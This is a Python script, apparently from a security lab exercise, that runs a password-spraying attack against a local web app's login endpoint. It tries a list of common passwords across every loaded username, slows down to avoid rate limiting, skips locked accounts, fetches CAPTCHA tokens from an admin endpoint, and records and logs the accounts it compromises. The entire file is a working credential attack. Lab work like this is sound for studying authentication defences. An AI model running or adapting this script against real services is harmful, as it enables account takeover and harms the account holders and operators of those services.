import time
import json
import os
import requests
from config import GROUP_SEED

BASE_URL = "http://127.0.0.1:5000"

DATA_DIR = "data"
USERS_FILE = "users.json"
USERS_PATH = os.path.join(DATA_DIR, USERS_FILE)

# Attack configuration
MAX_ATTEMPTS = 100000  # Higher for spraying as we test many users
MAX_DURATION_SECONDS = 7200  # 2 hours


def load_usernames(limit=None):
    """
    Load usernames from users.json.
    """
    if not os.path.exists(USERS_PATH):
        raise FileNotFoundError(f"Users file not found: {USERS_PATH}")

    with open(USERS_PATH, "r", encoding="utf-8") as f:
        data = json.load(f)

    usernames = [u["username"] for u in data]

    if limit is not None:
        usernames = usernames[:limit]

    return usernames


def get_common_passwords():
    """
    Get list of common passwords for spraying attack.
    These are typically the most common passwords used across all accounts.
    """
    return [
        "123456",
        "password",
        "12345678",
        "qwerty",
        "123456789",
        "12345",
        "1234",
        "111111",
        "1234567",
        "dragon",
        "123123",
        "baseball",
        "iloveyou",
        "trustno1",
        "1234567890",
        "sunshine",
        "master",
        "welcome",
        "password1",
        "admin",
        # Add GROUP_SEED as one password
        str(GROUP_SEED),
        # Add some known weak passwords from dataset
        "42400147",
        "70336321",
    ]


def get_captcha_token(username):
    """
    Get CAPTCHA token from admin endpoint.
    """
    try:
        resp = requests.get(
            f"{BASE_URL}/admin/get_captcha_token",
            params={"group_seed": GROUP_SEED, "username": username}
        )
        if resp.status_code == 200:
            return resp.json().get("captcha_token")
    except Exception as e:
        print(f"[!] Failed to get CAPTCHA token for {username}: {e}")
    return None


def password_spraying_attack(
    user_limit=None,
    max_attempts=MAX_ATTEMPTS,
    max_duration=MAX_DURATION_SECONDS,
    delay_between_attempts=0.1
):
    """
    Perform password spraying attack.
    
    Args:
        user_limit: Limit number of users (None = all)
        max_attempts: Maximum total attempts
        max_duration: Maximum duration in seconds
        delay_between_attempts: Delay to avoid rate limiting (seconds)
    """
    print("\n" + "="*60)
    print(f"PASSWORD SPRAYING ATTACK")
    print("="*60)
    print(f"User limit: {user_limit if user_limit else 'ALL'}")
    print(f"Max attempts: {max_attempts}")
    print(f"Max duration: {max_duration}s")
    print(f"Delay between attempts: {delay_between_attempts}s")
    print("="*60 + "\n")

    # Load data
    usernames = load_usernames(limit=user_limit)
    passwords = get_common_passwords()

    print(f"Loaded {len(usernames)} usernames")
    print(f"Testing {len(passwords)} common passwords")
    print()

    # Statistics tracking
    total_attempts = 0
    compromised_accounts = []  # List of (username, password)
    rate_limited_count = 0
    locked_accounts = set()
    captcha_challenges = {}  # username -> count
    captcha_tokens = {}  # username -> token

    start_time = time.perf_counter()

    # Spraying strategy: Try each password across all users
    for password_idx, password in enumerate(passwords, 1):
        if total_attempts >= max_attempts:
            print(f"\n[!] Reached max attempts limit: {max_attempts}")
            break

        elapsed = time.perf_counter() - start_time
        if elapsed >= max_duration:
            print(f"\n[!] Reached max duration: {max_duration}s")
            break

        print(f"\n[*] Round {password_idx}/{len(passwords)} - Testing password: '{password[:20]}...'")

        successful_this_round = 0

        for username in usernames:
            if total_attempts >= max_attempts:
                break

            elapsed = time.perf_counter() - start_time
            if elapsed >= max_duration:
                break

            # Skip if already compromised
            if any(u == username for u, _ in compromised_accounts):
                continue

            # Skip if locked
            if username in locked_accounts:
                continue

            total_attempts += 1

            # Prepare payload
            payload = {"username": username, "password": password}

            # Add CAPTCHA token if we have one
            if username in captcha_tokens:
                payload["captcha_token"] = captcha_tokens[username]

            try:
                resp = requests.post(f"{BASE_URL}/login", json=payload, timeout=10)

                if resp.status_code == 200:
                    # Success!
                    compromised_accounts.append((username, password))
                    successful_this_round += 1
                    print(f"  [+] SUCCESS: {username} <- '{password}'")
                    # Clear CAPTCHA state
                    captcha_tokens.pop(username, None)
                    captcha_challenges.pop(username, None)

                elif resp.status_code == 429:
                    # Rate limited
                    rate_limited_count += 1
                    if rate_limited_count % 10 == 0:
                        print(f"  [~] Rate limited ({rate_limited_count} times) - Slowing down...")
                    time.sleep(2)  # Back off

                elif resp.status_code == 403:
                    response_data = resp.json()
                    if response_data.get("captcha_required"):
                        # CAPTCHA required
                        if username not in captcha_challenges:
                            captcha_challenges[username] = 0
                        captcha_challenges[username] += 1
                        
                        # Get CAPTCHA token
                        if username not in captcha_tokens:
                            token = get_captcha_token(username)
                            if token:
                                captcha_tokens[username] = token
                                print(f"  [~] CAPTCHA required for {username}, got token")
                            else:
                                print(f"  [!] CAPTCHA required for {username}, couldn't get token")
                    
                    elif "locked" in response_data.get("error", "").lower():
                        # Account locked
                        locked_accounts.add(username)
                        print(f"  [!] Account locked: {username}")

                else:
                    # Failed attempt (wrong password)
                    pass

                # Delay to avoid rate limiting
                if delay_between_attempts > 0:
                    time.sleep(delay_between_attempts)

            except requests.exceptions.RequestException as e:
                print(f"  [!] Request error for {username}: {e}")
                time.sleep(1)

        print(f"  Compromised this round: {successful_this_round}")

    # Calculate statistics
    duration = time.perf_counter() - start_time
    attempts_per_sec = total_attempts / duration if duration > 0 else 0

    # Calculate success rate by category
    compromised_by_category = {"weak": 0, "medium": 0, "strong": 0}
    for username, _ in compromised_accounts:
        if "weak" in username:
            compromised_by_category["weak"] += 1
        elif "medium" in username:
            compromised_by_category["medium"] += 1
        elif "strong" in username:
            compromised_by_category["strong"] += 1

    print("\n" + "="*60)
    print("PASSWORD SPRAYING ATTACK SUMMARY")
    print("="*60)
    print(f"Total users tested:       {len(usernames)}")
    print(f"Total passwords tested:   {len(passwords)}")
    print(f"Total attempts:           {total_attempts}")
    print(f"Total duration:           {duration:.2f} seconds")
    print(f"Attempts per second:      {attempts_per_sec:.2f}")
    print(f"Rate limited events:      {rate_limited_count}")
    print(f"Accounts locked:          {len(locked_accounts)}")
    print(f"CAPTCHA challenges:       {len(captcha_challenges)}")
    print(f"\nCompromised accounts:     {len(compromised_accounts)}")
    print(f"  - Weak:                 {compromised_by_category['weak']}/10")
    print(f"  - Medium:               {compromised_by_category['medium']}/10")
    print(f"  - Strong:               {compromised_by_category['strong']}/10")
    print(f"\nSuccess rate:             {len(compromised_accounts)/len(usernames)*100:.1f}%")
    
    if compromised_accounts:
        print("\nCompromised accounts list:")
        for username, password in compromised_accounts:
            print(f"  - {username}: {password}")
    
    print("="*60 + "\n")

    return {
        "total_users": len(usernames),
        "total_passwords": len(passwords),
        "total_attempts": total_attempts,
        "duration": duration,
        "attempts_per_sec": attempts_per_sec,
        "compromised_count": len(compromised_accounts),
        "compromised_by_category": compromised_by_category,
        "success_rate": len(compromised_accounts) / len(usernames),
        "rate_limited": rate_limited_count,
        "locked_accounts": len(locked_accounts),
        "captcha_challenges": len(captcha_challenges),
        "compromised_list": [(u, p) for u, p in compromised_accounts],
    }


if __name__ == "__main__":
    # Run spraying attack
    result = password_spraying_attack(
        user_limit=None,  # Test all users
        max_attempts=100000,
        max_duration=7200,
        delay_between_attempts=0.1  # 100ms delay
    )
    
    # Save results
    results_file = "logs/spraying_results.json"
    os.makedirs("logs", exist_ok=True)
    
    with open(results_file, "w") as f:
        json.dump(result, f, indent=2, ensure_ascii=False)
    
    print(f"Results saved to {results_file}")
